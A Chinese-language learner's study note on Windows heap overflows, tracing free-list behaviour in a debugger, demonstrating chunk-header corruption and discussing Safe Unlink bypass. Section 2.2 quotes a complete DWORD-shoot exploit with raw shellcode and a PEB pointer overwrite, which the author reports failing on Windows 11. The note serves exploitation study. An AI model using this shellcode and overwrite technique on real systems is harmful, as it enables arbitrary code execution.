# 堆溢出：练习

---

> 
> 书中使用的环境是低版本的，为更好理解，本次在win11进行复现
> xdbg32 | vs2022buildtool | Clion 
> 复现不了，以后一定xxxx（好难学不会
>


> [!info] 
> 普通的资料
> https://www.v4ler1an.com/2019/11/windows-heap/ 
![](../images/Pasted%20image%2020250221112404.png)
## 1 空表

### 1.1 测试代码

虽然书上写要人工断点再附加，但是这样断点调起来好麻烦
先试试release版本的调试器直接加载
根据书上说的这样也会进入调试模式

- 调试堆不使用快表，只用空表分配
- 所有堆都被加上了多余的16字节尾部防止溢出（8个AB和8个00）
- 块首的标志位不同

```c
int main() {  
    char x;  
    HLOCAL h1,h2,h3,h4,h5,h6;  
    HANDLE hp;  
    hp = HeapCreate(0, 0x1000, 0x10000);  
    printf("HeapCreate end\n");  
    x = getchar();  
    //__asm int 3;  
  
    h1 = HeapAlloc(hp ,HEAP_ZERO_MEMORY, 3);  
    h2 = HeapAlloc(hp ,HEAP_ZERO_MEMORY, 5);  
    h3 = HeapAlloc(hp ,HEAP_ZERO_MEMORY, 6);  
    h4 = HeapAlloc(hp ,HEAP_ZERO_MEMORY, 8);  
    h5 = HeapAlloc(hp ,HEAP_ZERO_MEMORY, 19);  
    h6 = HeapAlloc(hp ,HEAP_ZERO_MEMORY, 24);  
  
    printf("HeapAlloc end\n");  
  
    HeapFree(hp, 0, h1);  
    HeapFree(hp, 0, h3);  
    HeapFree(hp, 0, h5);  
    HeapFree(hp, 0, h4);  
  
    return 0;  
}
```


### 1.2 HeapCreate

运行一下，可以看到EAX返回的是 00F00000
看起来第一行是一些标识符之类的？
![](../images/Pasted%20image%2020241220094244.png)
重新运行一次，返回的地址不是固定的
![](../images/Pasted%20image%2020241220095829.png)
到0x1000结束，似乎是一个完整的结构
![](../images/Pasted%20image%2020241220100110.png)

### 1.3 HeapAlloc

走到第一次call HeapAlloc返回值是00CA04B0
对于`HeapAlloc(hp ,HEAP_ZERO_MEMORY, 3)`来说
参数分别是 使用 `HeapCreate` 函数创建的堆的句柄，分配的内存块会被初始化为零，要分配的字节数=3

![](../images/Pasted%20image%2020241220100250.png)
![](../images/Pasted%20image%2020241220100347.png)

下一次分配，此时还是8个字节的赋值为0
![](../images/Pasted%20image%2020241220100453.png)

似乎找到了一些规律，往上翻翻理论上能找到空闲块块首（尾块）
接下来可以分配的应该是 00CA04D0，恰好再00CA00C0看到了这个值，而这个值还写在尾块的位置上
![](../images/Pasted%20image%2020241220100758.png)

分配到19字节的
![](../images/Pasted%20image%2020241220104620.png)


### 1.4 观察链表

目前没有看到形似AB和00的调试专属尾部，不排除是新版本和旧版本的不同导致的
块首标志位也看不出来，只能看看是不是空表分配了

空表：空闲双向链表
![](../images/Pasted%20image%2020241220103447.png)

快表：快速单向链表
![](../images/Pasted%20image%2020241220103458.png)

听起来都应该能在内存里找到

00CA00C0应该是对应着`freelist[0]`
最开始时尾块应该是00CA04B0，此时只有一个空闲的大块，叫尾块

![](../images/Pasted%20image%2020241220105933.png)
![](../images/Pasted%20image%2020241220104620.png)

书上的意思是这个后面的指针指向的都是自己，意味其他空闲链表都没有空闲块
但我这个里面似乎还有一个00CA0258
应该对应这个位置
![](../images/Pasted%20image%2020241220110609.png)
![](../images/Pasted%20image%2020241220110446.png)

尾块块首说的应该是
![](../images/Pasted%20image%2020241220111307.png)
看起来没什么有规律的堆单位？
对比一下，这个0D 0B 0A 08 0D 0D看起来有点规律，不过最新的是00，难道和还没分配有关？
![](../images/Pasted%20image%2020241220111559.png)

还真是，继续分配了，前面的E3 2B F3 A4变成了BC 2A F2 FB，和上一轮分配一致了
![](../images/Pasted%20image%2020241220111923.png)


好像理解了，现在其实就是两个元素（头和尾块）的双向链表

|      | freelist[0] | freelist[1] |
| :--- | :---------- | :---------- |
| cur  | 00CA00C0    | 00CA0530    |
| pre  | 00CA0530    | 00CA00C0    |
| next | 00CA0530    | 00CA00C0    |
至于尾块的大小，B2EF？不过这个位置确实和大小有关，前四个都是0xFDF22ABA，后两个都是0xFBF22ABC
尾块就是0xA8F32BEF相比于上一次分配时的0xA4F32BE3确实减少了400 000C
这次实际分配的是4x6=24字节，C=12？或许可以看看刚开始分配的图
9AF32BDD 9CF32BDB，或许第一位没有大小的意义
0xF32BDD - 0xF32BDB = 2 这次实际分配的是8个字节，代码分配的是5字节
看起来又没什么规律了
![](../images/Pasted%20image%2020241220100347.png)
![](../images/Pasted%20image%2020241220113647.png)

先继续往下看吧

### 1.5 HeapFree

释放第一个分配
FD变成FC，0D变成00，之前为0的空间被赋值为尾指针和首地址
尾地址的第2个指针变成了这个释放的地址
首地址的指针变成了这个释放的地址和尾地址
![](../images/Pasted%20image%2020241220114931.png)
![](../images/Pasted%20image%2020241220114618.png)
![](../images/Pasted%20image%2020241220114645.png)

也就是现在链表是

|      | freelist[0] | freelist[1] | freelist[2] |     |
| :--- | :---------- | :---------- | :---------- | --- |
| cur  | 00CA00C0    | 00CA04B0    | 00CA0530    |     |
| pre  | 00CA0530    | 00CA00C0    | 00CA04B0    |     |
| next | 00CA04B0    | 00CA0530    | 00CA00C0    |     |

## 2 溢出Shoot

### 2.1 测试溢出

参考代码

```cpp
int main()  
{  
    HANDLE hp;  
    HLOCAL h1, h2, h3;  
    char x;  
    char *buf;  
  
    hp = HeapCreate(0, 0x1000, 0x10000);  
  
  
  
    buf = (char *)HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);  
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);  
    x = getchar();  
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);  
  
    HeapFree(hp, 0, h1);  
  
    strcpy(buf, "AAAAAAAABBBBBBBBCCCCDDDD");  
    // buf大小为8,而字符串的长度是('A'*8+'B'*8+'C'*4+'D'*4)24  
    // 这里会产生溢出  
    // 其中'A'覆盖buf申请的空间，而'B'会覆盖下一个堆块的头（这里）  
    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); // DWORD SHOOT  
    return 0;  
}
```

在等待输入后注入，完成第三次分配通过返回值转到内存会看到：
![](../images/Pasted%20image%2020250214101725.png)

释放第二个分配：
![](../images/Pasted%20image%2020250214101836.png)

此时链表为 `00CA00C0<->00CA04C0<-> 00CA04E0<->00CA00C0`
![](../images/Pasted%20image%2020250214102151.png)

接下来分两次赋值，替换了链表的结点
![](../images/Pasted%20image%2020250214102310.png)
`00CA00C0?->00CA04C0(被覆盖)<-? 00CA04E0<->00CA00C0`

于是到在下一步的申请内存，就失败了。正常应该重新申请到这个被覆盖区域的内存。


### 2.2 试图Shoot

> [!note] 
> 很好的参考：
> https://onestraw.github.io/windows/introduction-heap-overflow-arbitrary-dword-reset/ 

```cpp
char shellcode[]=  
        "\x90\x90\x90\x90\x90\x90\x90\x90"  
        "\x90\x90\x90\x90"  
        //repaire the pointer which shooted by heap over run  
        "\xB8\x20\xF0\xFD\x7F"  //MOV EAX,7FFDF020  
        "\xBB\x03\x91\xF8\x77"  //MOV EBX,77F89103 the address here may releated to your OS  
        "\x89\x18"           //MOV DWORD PTR DS:[EAX],EBX  
        "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"  
        "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"  
        "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"  
        "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"  
        "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"  
        "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"  
        "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"  
        "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"  
        "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"  
        "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"  
        "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"  
        "\x16\x01\x1A\x00\x00\x10\x00\x00"// head of the ajacent free block  
        "\x44\x44\x44\x44\x00\x00\x00\x00";  
//0x00360688 is the address of shellcode in first heap block, you have to make sure this address via debug  
//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()  
//and will be called by ExitProcess() at last  
  
int main()  
{  
  
    HLOCAL h1 = 0, h2 = 0;  
    HANDLE hp;  
    //char x;  
    hp = HeapCreate(0,0x1000,0x10000);  
    //x = getchar();  
    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200);  
  
    //printf("%d\n",sizeof(shellcode)-1);  
    //__asm int 3 //used to break the process    //memcpy(h1,shellcode,200); //normal cpy, used to watch the heap    memcpy(h1,shellcode,0x200); //overflow,0x200=512  
    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);  
    return 0;  
}

```


正常的Alloc 运行到77bbc682就结束了，eax为申请的地址
![](../images/Pasted%20image%2020250217170511.png)
溢出后的alloc，返回了一个不正常的地址，走向005B2A5B，应该是报了异常
![](../images/Pasted%20image%2020250217170846.png)
![](../images/Pasted%20image%2020250217170926.png)


那么探索一下alloc做了什么，主要是77BBC690，拿到了新的内存
![](../images/Pasted%20image%2020250217171700.png)
![](../images/Pasted%20image%2020250217171737.png)
返回值其实来着edi，上面的call没有运行，直接跳过来的
![](../images/Pasted%20image%2020250217172326.png)


这里返回的应该是固定的4B0
![](../images/Pasted%20image%2020250217174109.png)
如果是溢出后的alloc，这里返回0x(+1)?020
![](../images/Pasted%20image%2020250217174340.png)
返回的就是这个值了
![](../images/Pasted%20image%2020250217174624.png)

大胆尝试，在eax手动改一个正常的4B0地址，报错会变成地址错误，而不是没有异常就卡住然后退出
（会不会是某种安全机制呢？win2000太古早了实在不想用那个试验哇）

测试没有溢出时这个函数调用的结果02AC -> 0580
大胆尝试，在eax手动改一个正常的0580，程序报了两次异常

又试了一下溢出后，把地址改为正常地址，发现还是异常

### 2.3 理解shoot过程

理解了这里到底要做什么

![](../images/Pasted%20image%2020250219171811.png)


存在链表是

|      | freelist[0] | freelist[1] | freelist[2] |     |
| :--- | :---------- | :---------- | :---------- | --- |
| cur  | A           | B           | C           |     |
| pre  | C           | A           | B           |     |
| next | B           | C           | A           |     |
| 存储   | B\|C        | C\|A        | A\|B        |     |
现在将节点1释放于是变成了

|      | freelist[0] | freelist[1] | freelist[2] |     |
| :--- | :---------- | :---------- | :---------- | --- |
| cur  | A           | B           | C           |     |
| pre  | C           | A->X        | B->A        |     |
| next | B->C        | C->X        | A           |     |
| 存储   | C\|C        |             | A\|A        |     |

溢出情况：

|      | freelist[0] | freelist[1] | freelist[2] |       |       |
| :--- | :---------- | :---------- | :---------- | ----- | ----- |
| cur  | A           | B           | C           | C1    | A1    |
| pre  | C           | A1->X       | B           | ?->A1 | ?     |
| next | B           | C1->X       | A           | ?     | ?->C1 |
| 存储   | C\|B        | C1\|A1      | A\|B        | ?\|A1 | C1\|? |
A1本应指向退出函数，修改后退出时就会调用C1处存的shellcode

正常情况应该是
![](../images/Pasted%20image%2020250221092738.png)
![](../images/Pasted%20image%2020250221092829.png)
看起来两个地址前面还有一些可能是校验的东西，如果直接覆盖，还是会异常
580-4B0=D0=208 正好是多8位
可是这个shellcode也正好多8位，看了一下原shellcode
![](../images/Pasted%20image%2020250221104747.png)
也就是在旧版本空表前面的8位是固定的

那么我们在溢出后，把地址再改回去

![](../images/Pasted%20image%2020250221104712.png)
可以顺利的通过这里了！
![](../images/Pasted%20image%2020250221104842.png)

于是将内存地址和返回值eax全部都改了
![](../images/Pasted%20image%2020250221110715.png)

还是报错了（
![](../images/Pasted%20image%2020250221110836.png)


> [!fail] 
> 写到这里实在调不出来了，想在win11复现好困难。存在一些还不知道的堆保护
> 用的是之前可以复现栈溢出的编译环境，应该不是dep和aslr的问题
> 于是往后翻了翻 发现了 第15章 重重保护下的堆
> 于是继续学习
## 3 绕过堆保护

### 3.1 绕过Safe Unlink

**Safe Unlink** 是一种用于安全地从数据结构（如链表）中删除节点的技术，旨在防止内存损坏和安全漏洞。它通常在操作系统、编程语言的运行时环境以及安全性相关的上下文中使用，尤其是在处理动态内存分配和数据结构时。
![](../images/Pasted%20image%2020250221162233.png)

通过一步步调试找到变换指针的位置，我这里是
0x77bbe5e3 修改旧chunk块首，删除旧chunk块
0x77bbe992 添加新chunk

这里应该在改新chunk块首，这个时候已经把新地址修改了
![](../images/Pasted%20image%2020250221155741.png)


以unlink这个逻辑改内存，将溢出覆盖的chunk头改成正常的头，可以让伪造的地址被修改成功
文中提供的shellcode，感觉也不符合绕过逻辑捏（

|      | 伪造   | freelist[1] | 异常   |     |
| :--- | :--- | :---------- | :--- | --- |
| cur  | A    | B           | C    |     |
| pre  | C    | A           | ?    |     |
| next | ?    | A           | A    |     |
| 存储   | ?\|C | A\|A        | A\|? |     |
不理解自己试试。


伪造情况：

|      | 伪造   | freelist[1] | 异常   |     |
| :--- | :--- | :---------- | :--- | --- |
| cur  | A    | B           | C    |     |
| pre  | C    | A           | B    |     |
| next | B    | C           | A    |     |
| 存储   | B\|C | C\|A        | A\|B |     |


|      | 伪造   | 异常   | 新   |
| :--- | :--- | :--- | --- |
| cur  | A    | C    | D   |
| pre  | C    | B->A | C   |
| next | B->C | A    | A   |
| 存储   | A\|C | A\|B |     |


A1本应指向退出函数，修改后退出时就会调用C1处存的shellcode




> [!note] 
> windows堆理论讲解 https://bbs.kanxue.com/thread-279617.htm
> Windows 10上的堆溢出漏洞利用 https://www.anquanke.com/post/id/180372
> win10堆溢出病毒解析 https://www.52pojie.cn/thread-1107471-1-1.html
> windows10下的堆结构及unlink分析 https://bbs.kanxue.com/thread-246570.htm